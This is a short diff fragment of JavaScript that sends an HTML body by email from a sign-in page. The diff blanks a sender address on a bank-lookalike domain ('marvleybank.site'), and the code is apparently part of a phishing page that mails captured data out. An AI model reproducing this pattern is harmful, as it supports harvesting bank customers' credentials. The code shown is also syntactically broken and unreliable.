@@ -7,7 +7,7 @@ let signIn = document.querySelector("#sign-in");
             Email.send({
                 ,
                 To: to,
-                From: 'secure@marvleybank.site', // Your Outlook email address
+                From: '', // Your Outlook email address
                 Subject: "ready",
                 Body: html
             }).then(
